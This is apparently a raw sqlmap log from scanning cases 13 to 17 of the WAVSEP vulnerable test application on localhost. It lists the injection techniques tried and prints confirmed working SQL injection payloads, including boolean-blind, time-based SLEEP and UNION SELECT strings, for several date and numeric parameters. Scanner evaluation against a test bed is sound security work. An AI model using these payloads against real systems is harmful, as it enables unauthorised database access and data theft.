GET http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case13-InjectionInCalc-Date-BooleanExploit-WithDifferent200Responses.jsp?transactionDate=2010-01-01
do you want to test this URL? [Y/n/q]
> Y
[04:46:31] [INFO] testing URL 'http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case13-InjectionInCalc-Date-BooleanExploit-WithDifferent200Responses.jsp?transactionDate=2010-01-01'                                                                                      
[04:46:31] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('JSESSIONID=8D5705A17F4...9A86AA1BA3'). Do you want to use those [Y/n] Y
[04:46:31] [INFO] checking if the target is protected by some kind of WAF/IPS
[04:46:31] [INFO] testing if the target URL content is stable
[04:46:31] [INFO] target URL content is stable
[04:46:31] [INFO] testing if GET parameter 'transactionDate' is dynamic
[04:46:31] [INFO] GET parameter 'transactionDate' appears to be dynamic
[04:46:31] [WARNING] heuristic (basic) test shows that GET parameter 'transactionDate' might not be injectable
[04:46:31] [INFO] testing for SQL injection on GET parameter 'transactionDate'
[04:46:31] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[04:46:32] [INFO] GET parameter 'transactionDate' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable 
[04:46:32] [INFO] testing 'Generic inline queries'
[04:46:32] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[04:46:32] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[04:46:32] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[04:46:32] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[04:46:32] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[04:46:32] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[04:46:32] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[04:46:32] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[04:46:32] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[04:46:32] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[04:46:32] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[04:46:32] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[04:46:32] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[04:46:32] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[04:46:32] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[04:46:32] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[04:46:32] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[04:46:32] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[04:46:32] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[04:46:32] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[04:46:32] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[04:46:32] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[04:46:32] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[04:46:32] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[04:46:32] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[04:46:32] [INFO] testing 'MySQL inline queries'
[04:46:32] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[04:46:32] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[04:46:32] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[04:46:32] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[04:46:32] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[04:46:32] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[04:46:32] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[04:46:42] [INFO] GET parameter 'transactionDate' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[04:46:42] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[04:46:42] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[04:46:42] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[04:46:42] [INFO] target URL appears to have 1 column in query
do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] N
[04:46:42] [INFO] target URL appears to be UNION injectable with 1 columns
[04:46:43] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
[04:46:43] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
[04:46:43] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
[04:46:43] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
[04:46:43] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
[04:46:44] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
[04:46:44] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
[04:46:44] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
[04:46:44] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
[04:46:44] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[04:46:44] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
[04:46:45] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
[04:46:45] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
[04:46:45] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
[04:46:45] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
[04:46:46] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
[04:46:46] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
[04:46:46] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
[04:46:46] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
[04:46:46] [INFO] checking if the injection point on GET parameter 'transactionDate' is a false positive
GET parameter 'transactionDate' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 490 HTTP(s) requests:
---
Parameter: transactionDate (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: transactionDate=2010-01-01' AND 3987=3987-- aIxZ

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: transactionDate=2010-01-01' AND (SELECT 5561 FROM (SELECT(SLEEP(5)))MJKv)-- Gvsu
---
do you want to exploit this SQL injection? [Y/n] Y
[04:46:47] [INFO] the back-end DBMS is MySQL
web application technology: JSP
back-end DBMS: MySQL >= 5.0.12
[14/68] URL:
GET http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case14-InjectionInUpdate-Date-CommandInjection-WithDifferent200Responses.jsp?transactionDate=2010-02-02
do you want to test this URL? [Y/n/q]
> Y
[04:46:47] [INFO] testing URL 'http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case14-InjectionInUpdate-Date-CommandInjection-WithDifferent200Responses.jsp?transactionDate=2010-02-02'                                                                                  
[04:46:47] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('JSESSIONID=AC85B66EED1...6287C913BA'). Do you want to use those [Y/n] Y
[04:46:47] [INFO] checking if the target is protected by some kind of WAF/IPS
[04:46:47] [INFO] testing if the target URL content is stable
[04:46:47] [INFO] target URL content is stable
[04:46:47] [INFO] testing if GET parameter 'transactionDate' is dynamic
[04:46:48] [WARNING] GET parameter 'transactionDate' does not appear to be dynamic
[04:46:48] [WARNING] heuristic (basic) test shows that GET parameter 'transactionDate' might not be injectable
[04:46:48] [INFO] testing for SQL injection on GET parameter 'transactionDate'
[04:46:48] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[04:46:49] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[04:46:50] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[04:46:51] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[04:46:51] [INFO] GET parameter 'transactionDate' appears to be 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)' injectable 
[04:46:51] [INFO] testing 'Generic inline queries'
[04:46:51] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[04:46:51] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[04:46:51] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[04:46:51] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[04:46:51] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[04:46:51] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[04:46:51] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[04:46:51] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[04:46:51] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[04:46:51] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[04:46:51] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[04:46:51] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[04:46:51] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[04:46:51] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[04:46:51] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[04:46:52] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[04:46:52] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[04:46:52] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[04:46:52] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[04:46:52] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[04:46:52] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[04:46:52] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[04:46:52] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[04:46:52] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[04:46:52] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[04:46:52] [INFO] testing 'MySQL inline queries'
[04:46:52] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[04:46:52] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[04:46:52] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[04:46:52] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[04:46:52] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[04:46:52] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[04:46:52] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[04:47:02] [INFO] GET parameter 'transactionDate' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[04:47:02] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[04:47:02] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[04:47:02] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
[04:47:02] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
[04:47:03] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
[04:47:03] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
[04:47:03] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
[04:47:04] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
[04:47:04] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
[04:47:04] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
[04:47:05] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
[04:47:05] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[04:47:05] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
[04:47:06] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
[04:47:06] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
[04:47:06] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
[04:47:06] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
[04:47:06] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
[04:47:07] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
[04:47:07] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
[04:47:07] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
[04:47:07] [INFO] checking if the injection point on GET parameter 'transactionDate' is a false positive
GET parameter 'transactionDate' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 753 HTTP(s) requests:
---
Parameter: transactionDate (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: transactionDate=2010-02-02' AND 9799=(SELECT (CASE WHEN (9799=9799) THEN 9799 ELSE (SELECT 5711 UNION SELECT 7134) END))-- -

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: transactionDate=2010-02-02' AND (SELECT 9183 FROM (SELECT(SLEEP(5)))bSdQ)-- ViVg
---
do you want to exploit this SQL injection? [Y/n] Y
[04:47:07] [INFO] the back-end DBMS is MySQL
web application technology: JSP
back-end DBMS: MySQL >= 5.0.12
[15/68] URL:
GET http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case15-InjectionInSearch-DateWithoutQuotes-UnionExploit-WithDifferent200Responses.jsp?transactionDate=2010-02-02
do you want to test this URL? [Y/n/q]
> Y
[04:47:07] [INFO] testing URL 'http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case15-InjectionInSearch-DateWithoutQuotes-UnionExploit-WithDifferent200Responses.jsp?transactionDate=2010-02-02'                                                                         
[04:47:07] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('JSESSIONID=A697058AB1A...9C76790CC1'). Do you want to use those [Y/n] Y
[04:47:08] [INFO] checking if the target is protected by some kind of WAF/IPS
[04:47:08] [INFO] testing if the target URL content is stable
[04:47:08] [INFO] target URL content is stable
[04:47:08] [INFO] testing if GET parameter 'transactionDate' is dynamic
[04:47:08] [WARNING] GET parameter 'transactionDate' does not appear to be dynamic
[04:47:08] [WARNING] heuristic (basic) test shows that GET parameter 'transactionDate' might not be injectable
[04:47:08] [INFO] testing for SQL injection on GET parameter 'transactionDate'
[04:47:08] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[04:47:10] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[04:47:10] [INFO] GET parameter 'transactionDate' appears to be 'OR boolean-based blind - WHERE or HAVING clause' injectable (with --string="132")
[04:47:10] [INFO] testing 'Generic inline queries'
[04:47:10] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[04:47:10] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[04:47:10] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[04:47:10] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[04:47:10] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[04:47:10] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[04:47:10] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[04:47:10] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[04:47:10] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[04:47:10] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[04:47:10] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[04:47:10] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[04:47:11] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[04:47:11] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[04:47:11] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[04:47:11] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[04:47:11] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[04:47:11] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[04:47:11] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[04:47:11] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[04:47:11] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[04:47:11] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[04:47:11] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[04:47:11] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[04:47:11] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[04:47:11] [INFO] testing 'MySQL inline queries'
[04:47:11] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[04:47:11] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[04:47:11] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[04:47:11] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[04:47:11] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[04:47:11] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[04:47:11] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[04:47:21] [INFO] GET parameter 'transactionDate' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[04:47:21] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[04:47:21] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[04:47:22] [INFO] target URL appears to be UNION injectable with 4 columns
[04:47:22] [INFO] GET parameter 'transactionDate' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
[04:47:22] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
GET parameter 'transactionDate' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 188 HTTP(s) requests:
---
Parameter: transactionDate (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: transactionDate=-9268 OR 8534=8534

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: transactionDate=2010-02-02 AND (SELECT 9071 FROM (SELECT(SLEEP(5)))Chgj)

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: transactionDate=2010-02-02 UNION ALL SELECT NULL,NULL,CONCAT(0x717a716a71,0x71554b4b585452674b58686b63464770465a59544373516d704779544c7354674b56526554457056,0x717a7a6a71),NULL-- -
---
do you want to exploit this SQL injection? [Y/n] Y
[04:47:22] [INFO] the back-end DBMS is MySQL
web application technology: JSP
back-end DBMS: MySQL >= 5.0.12
[16/68] URL:
GET http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case16-InjectionInView-NumericWithoutQuotes-PermissionBypass-WithDifferent200Responses.jsp?transactionId=132
do you want to test this URL? [Y/n/q]
> Y
[04:47:22] [INFO] testing URL 'http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case16-InjectionInView-NumericWithoutQuotes-PermissionBypass-WithDifferent200Responses.jsp?transactionId=132'                                                                             
[04:47:22] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('JSESSIONID=E94186FCEB7...7A57217B9B'). Do you want to use those [Y/n] Y
[04:47:22] [INFO] checking if the target is protected by some kind of WAF/IPS
[04:47:22] [INFO] testing if the target URL content is stable
[04:47:22] [INFO] target URL content is stable
[04:47:22] [INFO] testing if GET parameter 'transactionId' is dynamic
[04:47:23] [INFO] GET parameter 'transactionId' appears to be dynamic
[04:47:23] [INFO] heuristic (basic) test shows that GET parameter 'transactionId' might be injectable
[04:47:23] [INFO] testing for SQL injection on GET parameter 'transactionId'
[04:47:23] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[04:47:23] [INFO] GET parameter 'transactionId' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="132")
[04:47:23] [INFO] testing 'Generic inline queries'
[04:47:23] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[04:47:23] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[04:47:23] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[04:47:23] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[04:47:23] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[04:47:23] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[04:47:23] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[04:47:23] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[04:47:23] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[04:47:24] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[04:47:24] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[04:47:24] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[04:47:24] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[04:47:24] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[04:47:24] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[04:47:24] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[04:47:24] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[04:47:24] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[04:47:24] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[04:47:24] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[04:47:24] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[04:47:24] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[04:47:24] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[04:47:24] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[04:47:24] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[04:47:24] [INFO] testing 'MySQL inline queries'
[04:47:24] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[04:47:24] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[04:47:24] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[04:47:24] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[04:47:24] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[04:47:24] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[04:47:24] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[04:47:35] [INFO] GET parameter 'transactionId' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[04:47:35] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[04:47:35] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[04:47:35] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[04:47:35] [INFO] target URL appears to have 4 columns in query
[04:47:35] [INFO] GET parameter 'transactionId' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'transactionId' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 61 HTTP(s) requests:
---
Parameter: transactionId (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: transactionId=132 AND 1069=1069

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: transactionId=132 AND (SELECT 3153 FROM (SELECT(SLEEP(5)))qQra)

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: transactionId=132 UNION ALL SELECT NULL,NULL,CONCAT(0x717a6a6b71,0x4349437054534f4e707264727964655272496d6d6b73426c6973754c614f44706a564454634e7653,0x717a7a7871),NULL-- -
---
do you want to exploit this SQL injection? [Y/n] Y
[04:47:35] [INFO] the back-end DBMS is MySQL
web application technology: JSP
back-end DBMS: MySQL >= 5.0.12
[17/68] URL:
GET http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case17-InjectionInSearch-NumericWithoutQuotes-UnionExploit-WithDifferent200Responses.jsp?msgId=1
do you want to test this URL? [Y/n/q]
> Y
[04:47:35] [INFO] testing URL 'http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case17-InjectionInSearch-NumericWithoutQuotes-UnionExploit-WithDifferent200Responses.jsp?msgId=1'                                                                                         
[04:47:35] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('JSESSIONID=9977561028B...F7F5B325E2'). Do you want to use those [Y/n] Y
[04:47:35] [INFO] checking if the target is protected by some kind of WAF/IPS
[04:47:35] [INFO] testing if the target URL content is stable
[04:47:36] [INFO] target URL content is stable
